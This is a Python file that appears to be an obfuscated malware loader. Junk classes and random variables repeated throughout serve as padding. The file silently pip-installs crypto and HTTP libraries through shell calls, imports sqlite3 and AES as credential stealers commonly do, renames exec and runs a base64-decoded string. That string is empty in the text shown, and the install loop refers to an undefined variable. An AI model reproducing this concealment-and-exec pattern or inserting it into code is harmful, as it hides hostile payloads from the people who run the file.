

from sys import executable, stderr
OkUqZpYSDF = 72393649
class Lz0RRj8kK5:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class F0zDHwvrfp:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
Oh6xli5LVt = 50643499
["'JTMvNRAUAu'"]
qQfm50bezZ = 98766833
class UwTgbUv14Z:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class MJzbMfQAQ9:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'vtTtrfwXrz'
f9qq5K5qwI = 42361284
fuAGXWCTa2 = 33500289
class EZ2Nf6IwsU:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'GzEFAKY', 'age': 35}
Tw21d2Hu9T = 35582284
GEq82J9TT4 = 64259998
class e6nKA7ox5q:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
zlw6JFfBYq = 13455528
class tpLVSvD5js:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class JmMZVc0Nv5:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
k2lQScx1gz = 18109981
class B5wXGMjHP9:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class kELfOh6ruE:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
kAVWQlvhe2 = 30981482
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
OkUqZpYSDF = 72393649
class Lz0RRj8kK5:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class F0zDHwvrfp:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
Oh6xli5LVt = 50643499
["'JTMvNRAUAu'"]
qQfm50bezZ = 98766833
class UwTgbUv14Z:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class MJzbMfQAQ9:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'vtTtrfwXrz'
f9qq5K5qwI = 42361284
fuAGXWCTa2 = 33500289
class EZ2Nf6IwsU:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'GzEFAKY', 'age': 35}
Tw21d2Hu9T = 35582284
GEq82J9TT4 = 64259998
class e6nKA7ox5q:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
zlw6JFfBYq = 13455528
class tpLVSvD5js:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class JmMZVc0Nv5:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
k2lQScx1gz = 18109981
class B5wXGMjHP9:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class kELfOh6ruE:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
kAVWQlvhe2 = 30981482
bwy4KBKSGNNVOeJjXyCcjgIsW9JohhAhiblsYT = exec
OkUqZpYSDF = 72393649
class Lz0RRj8kK5:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class F0zDHwvrfp:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
Oh6xli5LVt = 50643499
["'JTMvNRAUAu'"]
qQfm50bezZ = 98766833
class UwTgbUv14Z:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class MJzbMfQAQ9:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'vtTtrfwXrz'
f9qq5K5qwI = 42361284
fuAGXWCTa2 = 33500289
class EZ2Nf6IwsU:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'GzEFAKY', 'age': 35}
Tw21d2Hu9T = 35582284
GEq82J9TT4 = 64259998
class e6nKA7ox5q:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
zlw6JFfBYq = 13455528
class tpLVSvD5js:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class JmMZVc0Nv5:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
k2lQScx1gz = 18109981
class B5wXGMjHP9:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class kELfOh6ruE:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
kAVWQlvhe2 = 30981482
import concurrent.futures
FYSwVVzwbeP6I8S4DQFutZV8ajRkRYbPD9ygsH=""
bwy4KBKSGNNVOeJjXyCcjgIsW9JohhAhiblsYT(base64.b64decode(FYSwVVzwbeP6I8S4DQFutZV8ajRkRYbPD9ygsH))
OkUqZpYSDF = 72393649
class Lz0RRj8kK5:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class F0zDHwvrfp:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
Oh6xli5LVt = 50643499
["'JTMvNRAUAu'"]
qQfm50bezZ = 98766833
class UwTgbUv14Z:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class MJzbMfQAQ9:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'vtTtrfwXrz'
f9qq5K5qwI = 42361284
fuAGXWCTa2 = 33500289
class EZ2Nf6IwsU:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'GzEFAKY', 'age': 35}
Tw21d2Hu9T = 35582284
GEq82J9TT4 = 64259998
class e6nKA7ox5q:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
zlw6JFfBYq = 13455528
class tpLVSvD5js:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class JmMZVc0Nv5:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
k2lQScx1gz = 18109981
class B5wXGMjHP9:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class kELfOh6ruE:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
kAVWQlvhe2 = 30981482
